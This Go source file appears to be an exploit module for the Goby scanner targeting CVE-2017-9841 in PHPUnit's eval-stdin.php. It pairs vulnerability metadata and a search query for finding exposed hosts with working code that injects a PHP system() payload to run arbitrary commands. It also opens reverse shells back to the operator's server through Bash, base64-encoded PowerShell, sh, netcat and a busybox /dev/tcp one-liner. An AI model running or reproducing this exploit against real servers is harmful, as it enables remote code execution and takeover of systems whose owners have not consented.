package exploits

import (
	"encoding/base64"
	"errors"
	"fmt"
	"net/url"
	"regexp"
	"strconv"
	"strings"
	"time"
	"unicode/utf16"

	"git.gobies.org/goby/goscanner/godclient"
	"git.gobies.org/goby/goscanner/goutils"
	"git.gobies.org/goby/goscanner/jsonvul"
	"git.gobies.org/goby/goscanner/scanconfig"
	"git.gobies.org/goby/httpclient"
)

func init() {
	expJson := `{
    "Name": "PHPUnit eval-stdin.php Code Execution Vulnerability(CVE-2017-9841)",
    "Description": "<p>PHPUnit is a popular PHP testing framework for writing and running unit and functional tests. It is a powerful and flexible tool that helps PHP developers write reliable and efficient test suites to ensure the quality and stability of their code.</p><p>In versions 4.8.19 to 4.8.27 and 5.0.10 to 5.6.2 of eval-stdin.php, if the file is directly accessed by the user, it will cause code execution. The attacker can use this vulnerability to execute arbitrary code on the server side. Write a backdoor, obtain server permissions, and then control the entire web server.</p>",
    "Product": "PHPUnit",
    "Homepage": "https://github.com/sebastianbergmann/phpunit",
    "DisclosureDate": "2017-06-27",
    "PostTime": "2024-09-29",
    "Author": "3013320359@qq.com",
    "FofaQuery": "body=\"PHPUnit\" && body=\"Vendor\"",
    "GobyQuery": "body=\"PHPUnit\" && body=\"Vendor\"",
    "Level": "3",
    "Impact": "<p>In versions 4.8.19 to 4.8.27 and 5.0.10 to 5.6.2 of eval-stdin.php, if the file is directly accessed by the user, it will cause code execution. The attacker can use this vulnerability to execute arbitrary code on the server side. Write a backdoor, obtain server permissions, and then control the entire web server.</p>",
    "Recommendation": "<p>1. The manufacturer has released a solution, please update to the latest version: <a href=\"https://github.com/sebastianbergmann/phpunit\">https://github.com/sebastianbergmann/phpunit</a></p><p>2. Deploy a web application firewall to monitor database operations.</p><p>3. Unless necessary, it is prohibited to access the system from the public network.</p>",
    "References": [
        "https://github.com/sebastianbergmann/phpunit/commit/284a69fb88a2d0845d23f42974a583d8f59bf5a5"
    ],
    "Is0day": false,
    "HasExp": true,
    "ExpParams": [
        {
            "name": "attackType",
            "type": "select",
            "value": "cmd",
            "show": ""
        },
        {
            "name": "cmd",
            "type": "input",
            "value": "id",
            "show": "attackType=cmd"
        }
    ],
    "ExpTips": {
        "Type": "",
        "Content": ""
    },
    "ScanSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/test.php",
                "follow_redirect": true,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "test",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "ExploitSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/test.php",
                "follow_redirect": true,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "test",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "Tags": [
        "Code Execution",
        "2H1W"
    ],
    "VulType": [
        "Code Execution"
    ],
    "CVEIDs": [
        "CVE-2017-9841"
    ],
    "CNNVD": [
        "CNNVD-201706-1127"
    ],
    "CNVD": [
        ""
    ],
    "CVSSScore": "9.8",
    "Translation": {
        "CN": {
            "Name": "PHPUnit eval-stdin.php 代码执行漏洞 （CVE-2017-9841）",
            "Product": "PHPUnit",
            "Description": "<p>PHPUnit 是一个流行的 PHP 测试框架，用于编写和运行单元测试和功能测试。它是一个功能强大且灵活的工具，可以帮助 PHP 开发人员编写可靠和高效的测试套件，以确保他们的代码的质量和稳定性。</p><p>在 4.8.19 到 4.8.27 和 5.0.10 到 5.6.2 版本的 eval-stdin.php 如果该文件被用户直接访问到，将造成代码执行，攻击者可通过该漏洞在服务器端任意执行代码，写入后门，获取服务器权限，进而控制整个web服务器。</p>",
            "Recommendation": "<p>1、厂商已发布解决方案，请更新到最新版本：<a href=\"https://github.com/sebastianbergmann/phpunit\">https://github.com/sebastianbergmann/phpunit</a></p><p>2、部署Web应用防火墙，对数据库操作进行监控。</p><p>3、如非必要，禁止公网访问该系统。</p>",
            "Impact": "<p>在 4.8.19 到 4.8.27 和 5.0.10 到 5.6.2 版本的 eval-stdin.php 如果该文件被用户直接访问到，将造成代码执行，攻击者可通过该漏洞在服务器端任意执行代码，写入后门，获取服务器权限，进而控制整个web服务器。<br></p>",
            "VulType": [
                "代码执行"
            ],
            "Tags": [
                "代码执行",
                "两高一弱"
            ]
        },
        "EN": {
            "Name": "PHPUnit eval-stdin.php Code Execution Vulnerability(CVE-2017-9841)",
            "Product": "PHPUnit",
            "Description": "<p>PHPUnit is a popular PHP testing framework for writing and running unit and functional tests. It is a powerful and flexible tool that helps PHP developers write reliable and efficient test suites to ensure the quality and stability of their code.</p><p>In versions 4.8.19 to 4.8.27 and 5.0.10 to 5.6.2 of eval-stdin.php, if the file is directly accessed by the user, it will cause code execution. The attacker can use this vulnerability to execute arbitrary code on the server side. Write a backdoor, obtain server permissions, and then control the entire web server.</p>",
            "Recommendation": "<p>1. The manufacturer has released a solution, please update to the latest version: <a href=\"https://github.com/sebastianbergmann/phpunit\">https://github.com/sebastianbergmann/phpunit</a></p><p>2. Deploy a web application firewall to monitor database operations.</p><p>3. Unless necessary, it is prohibited to access the system from the public network.</p>",
            "Impact": "<p>In versions 4.8.19 to 4.8.27 and 5.0.10 to 5.6.2 of eval-stdin.php, if the file is directly accessed by the user, it will cause code execution. The attacker can use this vulnerability to execute arbitrary code on the server side. Write a backdoor, obtain server permissions, and then control the entire web server.<br></p>",
            "VulType": [
                "Code Execution"
            ],
            "Tags": [
                "Code Execution",
                "2H1W"
            ]
        }
    },
    "AttackSurfaces": {
        "Application": null,
        "Support": null,
        "Service": null,
        "System": null,
        "Hardware": null
    },
    "Variables": {},
    "PocId": "9957"
}`
	setPayloadRequestHash488WEKtUjQ := func(hostInfo *httpclient.FixUrl, command string) (string, string, error) {
		//command为原始命令，如果需编码，请自行编码后使用
		command = strconv.Quote(command)
		//漏洞url地址
		vulPath := "/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php"
		postRequestConfig := httpclient.NewPostRequestConfig(vulPath)
		postRequestConfig.VerifyTls = false
		postRequestConfig.FollowRedirect = false
		postRequestConfig.Data = "<?php echo md5('sksjhdiu'); system(" + command + "); echo md5('sksjhdiu');?>"
		//请求头
		head := map[string]string{
			"Content-Type": "application/x-www-form-urlencoded",
		}
		for headName, headValue := range head {
			postRequestConfig.Header.Store(headName, headValue)
		}
		//请求
		response, err := httpclient.DoHttpRequest(hostInfo, postRequestConfig)
		if err != nil {
			return "", "", err
		} //错误检查
		if !strings.Contains(response.Utf8Html, "a3c0842f02ae836ed79833d7d6cf5e5d") {
			return "", "", errors.New("RCE Fail")
		}
		regStr := `a3c0842f02ae836ed79833d7d6cf5e5d([\s\S]*?)a3c0842f02ae836ed79833d7d6cf5e5d` //正则表达式
		regObj := regexp.MustCompile(regStr)
		if !regObj.MatchString(response.RawBody) {
			return "", "", errors.New("RCE Fail")
		}
		getname := regObj.FindStringSubmatch(response.RawBody)

		//命令执行的结果，如果结果是编码的，请自己解码后返回，如果返回为空的字符串，则判断命令执行失败
		commandResult := getname[1]
		if len(commandResult) == 0 {
			return "", "", errors.New("RCE Fail")
		}
		return commandResult, vulPath, nil
	}

	ExpManager.AddExploit(NewExploit(
		goutils.GetFileName(),
		expJson,
		//poc验证函数
		func(exp *jsonvul.JsonVul, hostInfo *httpclient.FixUrl, ss *scanconfig.SingleScanConfig) bool {
			//setPayloadRequestHash函数会赋值给runPayload，请自行重命名setPayloadRequestHash函数
			runPayload := setPayloadRequestHash488WEKtUjQ
			text := goutils.RandomHexString(16)
			pocCommand := `echo ` + text
			pocRuselt, pocUrl, err := runPayload(hostInfo, pocCommand)
			if err != nil {
				return false
			}
			if strings.Contains(pocRuselt, text) {
				ss.VulURL = hostInfo.FixedHostInfo + pocUrl
				return true
			}
			return false
		},
		//exp利用函数
		func(expResult *jsonvul.ExploitResult, ss *scanconfig.SingleScanConfig) *jsonvul.ExploitResult {
			//setPayloadRequestHash函数会赋值给runPayload，请自行重命名setPayloadRequestHash函数
			runPayload := setPayloadRequestHash488WEKtUjQ

			setReverseWaitting := func(expResult *jsonvul.ExploitResult, waitSessionCh chan string) {
				select {
				case webConsleID := <-waitSessionCh:
					if u, err := url.Parse(webConsleID); err == nil {
						expResult.Success = true
						expResult.OutputType = "html"
						sid := strings.Join(u.Query()["id"], "")
						expResult.Output += `<br/> <a href="goby://sessions/view?sid=` + sid + `&key=` + godclient.GetKey() + `">open shell</a>`
					} else {
						expResult.Success = false
						expResult.Output = "reverse shell fail"
					}
				case <-time.After(time.Second * 25):
				}
			}

			ReverseTcpByBusyBox := func(rp string) string {
				return fmt.Sprintf("busybox sh -c 'sh -i >& /dev/tcp/%s/%s 0>&1'", godclient.GetGodServerIP(), rp)
			}

			setReverseRequest := func(reverseType string) (string, chan string, error) {
				typeList := map[string]func(string) string{
					"ByBash":             godclient.ReverseTCPByBash,
					"ByBashBase64":       godclient.ReverseTCPByBash,
					"ByPowershell":       godclient.ReverseTCPByPowershell,
					"ByPowershellBase64": godclient.ReverseTCPByPowershell,
					"BySh":               godclient.ReverseTCPBySh,
					"ByNcBsd":            godclient.ReverseTCPByNcBsd,
					"ByBusyBox":          ReverseTcpByBusyBox,
				}
				if revserTypeNew := typeList[reverseType]; revserTypeNew == nil {
					return "", nil, errors.New("vaild exsploit")
				}
				waitSessionCh := make(chan string)

				if strings.Contains(reverseType, "ByPowershell") {
					if rp, err := godclient.WaitSession("reverse_windows", waitSessionCh); err != nil || len(rp) >= 0 {
						command := typeList[reverseType](rp)
						if reverseType == "ByPowershellBase64" {
							utf16Bytes := utf16.Encode([]rune(strings.TrimLeft(command, "powershell ")))
							bytes := make([]byte, len(utf16Bytes)*2)
							for i, v := range utf16Bytes {
								bytes[i*2] = byte(v)
								bytes[i*2+1] = byte(v >> 8)
							}
							command = "powershell -e " + base64.StdEncoding.EncodeToString(bytes)
						}
						return command, waitSessionCh, nil
					}
				} else {
					if rp, err := godclient.WaitSession("reverse_linux_none", waitSessionCh); err != nil || len(rp) >= 0 {
						command := typeList[reverseType](rp)
						if reverseType == "ByBashBase64" {
							command = "bash -c '{echo," + base64.StdEncoding.EncodeToString([]byte(command)) + "}|{base64,-d}|{bash,-i}'"
						}
						return command, waitSessionCh, nil
					}
				}
				return "", waitSessionCh, errors.New("gain command fail")
			}

			attackType := goutils.B2S(ss.Params["attackType"])
			switch attackType {
			case "cmd":
				//配置命令
				command := goutils.B2S(ss.Params["cmd"])
				Result, _, err := runPayload(expResult.HostInfo, command)

				if err != nil {
					expResult.Success = false
					expResult.Output = err.Error()
					return expResult
				}

				if len(Result) > 0 {
					expResult.Success = true
					expResult.Output = Result
				} else {
					expResult.Success = false
					expResult.Output = err.Error()
				}
			case "reverse":
				//配置反弹shell的类型
				reversetype := goutils.B2S(ss.Params["reverse"])
				if command, waitSessionCh, err := setReverseRequest(reversetype); command != "" {
					go runPayload(expResult.HostInfo, command)
					setReverseWaitting(expResult, waitSessionCh)
				} else {
					expResult.Success = false
					expResult.Output = err.Error()
				}
			default:
				expResult.Success = false
				expResult.Output = `未知的利用方式`
			}
			return expResult
		},
	))
}
